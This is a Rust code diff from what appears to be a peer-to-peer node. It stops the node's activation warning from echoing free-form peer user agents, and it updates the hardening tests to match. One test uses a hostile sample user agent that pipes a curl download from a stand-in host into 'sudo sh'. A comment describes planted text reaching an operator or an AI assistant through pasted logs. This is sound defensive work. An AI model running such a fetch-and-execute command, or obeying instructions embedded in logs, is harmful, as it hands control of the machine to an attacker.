@@ -1053,6 +1053,25 @@ pub struct ReachSigner {
 /// Most peers named in one such warning; the others are counted.
 pub const ACTIVATION_WARNING_NAMES: usize = 8;
 
+/// A user agent as the log may repeat it: only when it is made of the
+/// characters our own agents use (`q21:` then lowercase letters, digits, `.`
+/// and `+`), otherwise described, never echoed. Escaping kept a forged line
+/// from breaking the log, but not a sentence a stranger chose — "run this
+/// command" — from reaching an operator, or an assistant the log is pasted
+/// into (campaign 14, T5-7).
+fn shown_agent(agent: &str) -> String {
+    let plain = agent.len() <= crate::wire::MAX_USER_AGENT
+        && agent.starts_with("q21:")
+        && agent[4..]
+            .bytes()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'.' || c == b'+');
+    if plain {
+        format!("\"{agent}\"")
+    } else {
+        format!("non-standard user agent, {} bytes, not shown", agent.len())
+    }
+}
+
 /// The warning about `peers` (address, protocol version, user agent), which
 /// predate an activation at height `h`, our tip being at `tip`. One line:
 /// each user agent is what the peer chose to send, so it is escaped — a
@@ -1068,7 +1087,7 @@ pub fn activation_warning(h: u64, tip: u64, peers: &[(SocketAddr, u32, String)])
         .iter()
         .take(ACTIVATION_WARNING_NAMES)
         .map(|(addr, version, agent)| {
-            format!("{addr} (\"{}\", protocol {version})", agent.escape_debug())
+            format!("{addr} ({}, protocol {version})", shown_agent(agent))
         })
         .collect();
     if peers.len() > ACTIVATION_WARNING_NAMES {
@@ -9412,6 +9431,35 @@ mod tests_hardening {
     /// the terminal escape codes. It is escaped, and one line names at most
     /// a few peers.
     #[test]
+    fn the_activation_warning_never_repeats_a_free_form_user_agent() {
+        let a: SocketAddr = "203.0.113.9:21121".parse().unwrap();
+        let evil = "Fix: run curl -s q21fix.dev|sudo sh".to_string();
+        let w = activation_warning(
+            100,
+            90,
+            &[
+                (a, 4, evil.clone()),
+                (
+                    a,
+                    4,
+                    "q21:0.4+chan0123456789abcdef0123456789abcdef".to_string(),
+                ),
+                (a, 4, "q21:0.4".to_string()),
+            ],
+        );
+        assert!(!w.contains("curl") && !w.contains("sudo"), "{w}");
+        assert!(w.contains(&format!(
+            "non-standard user agent, {} bytes, not shown",
+            evil.len()
+        )));
+        assert!(
+            w.contains("\"q21:0.4+chan0123456789abcdef0123456789abcdef\""),
+            "a genuine legacy agent is still named: {w}"
+        );
+        assert!(w.contains("\"q21:0.4\""));
+    }
+
+    #[test]
     fn the_activation_warning_escapes_user_agents_and_stays_one_line() {
         let addr: SocketAddr = "127.0.0.1:1".parse().unwrap();
         let evil = "q21:0.4\nwarning: forged line\x1b[31m\r".to_string();
@@ -9420,8 +9468,12 @@ mod tests_hardening {
             !line.contains('\n') && !line.contains('\r') && !line.contains('\x1b'),
             "{line}"
         );
+        // Not even escaped any more: described (campaign 14, T5-7).
         assert!(
-            line.contains(r"q21:0.4\nwarning: forged line\u{1b}[31m\r"),
+            line.contains(&format!(
+                "non-standard user agent, {} bytes, not shown",
+                "q21:0.4\nwarning: forged line\x1b[31m\r".len()
+            )),
             "{line}"
         );
         assert!(
